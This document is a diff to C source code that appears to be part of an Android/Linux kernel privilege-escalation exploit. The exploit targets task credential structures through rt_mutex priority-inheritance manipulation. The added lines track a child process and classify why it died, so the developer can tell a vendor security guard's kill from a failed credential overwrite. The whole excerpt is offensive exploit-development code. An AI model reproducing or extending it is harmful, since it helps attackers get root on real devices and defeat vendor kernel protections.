@@ -156,6 +156,7 @@ atomic_int route_done;
 volatile long long g_select_start_us;
 uintptr_t g_child_task;
 uintptr_t g_child_cred;
+pid_t g_cap_child_pid = -1;
 atomic_int waiter_tid;
 /* Per-phase consumer nice: each walk must CHANGE the waiter task's prio,
  * or __sched_setscheduler returns early and rt_mutex_adjust_pi never runs. */
@@ -3868,6 +3869,7 @@ int run_exploit(int argc, char **argv) {
             report[0] && report[1]) {
           g_child_task = (uintptr_t)report[0];
           g_child_cred = (uintptr_t)report[1];
+          g_cap_child_pid = cap_child;
           proof_tgt = g_child_task + TASK_CRED_OFF;
           pr_info("CAPSONLY v2: child_task=%016zx child_cred=%016zx "
                   "target=%016zx\n",
@@ -4008,6 +4010,34 @@ int run_exploit(int argc, char **argv) {
     pr_info("WRITE_PROOF %s — stopping (no W1). MODE4_ONLY implied.\n",
             landed ? "POSITIVE store executes on-device"
                    : "NEGATIVE (walk miss / wrong alias / no write)");
+    /*
+     * CAPSONLY child-death forensics (campaign 45): the child died on
+     * every survivor. waitpid reveals WHO killed it:
+     *   WIFSIGNALED+SIGKILL → oplus guard (uid logic wrong)
+     *   WIFSIGNALED+SIGSEGV/SIGBUS → bad cred deref (write landed dirty)
+     *   WIFEXITED → child's own path (never expected)
+     *   alive (0) → write missed entirely
+     */
+    if (env_flag("MODE4_CAPSONLY", 0) && g_child_task) {
+      int cst = 0;
+      pid_t wr = waitpid(g_cap_child_pid, &cst, WNOHANG);
+      if (wr == 0) {
+        pr_info("CAPSONLY child ALIVE pid=%d (write missed or pending)\n",
+                (int)g_cap_child_pid);
+      } else if (wr == g_cap_child_pid) {
+        if (WIFSIGNALED(cst))
+          pr_error("CAPSONLY child KILLED by signal %d (%s)\n",
+                   WTERMSIG(cst),
+                   WTERMSIG(cst) == 9 ? "SIGKILL=guard"
+                   : WTERMSIG(cst) == 7 ? "SIGBUS=bad-cred-deref"
+                   : WTERMSIG(cst) == 11 ? "SIGSEGV=bad-cred-deref"
+                                         : "other");
+        else if (WIFEXITED(cst))
+          pr_error("CAPSONLY child EXITED code=%d\n", WEXITSTATUS(cst));
+      } else {
+        pr_info("CAPSONLY child waitpid errno=%d (already reaped?)\n", errno);
+      }
+    }
     /*
      * Same-process park→cred. Z5 second process on a park boot KP'd at
      * requeue. fire_mode sets MODE4_ONLY so this must run here, before
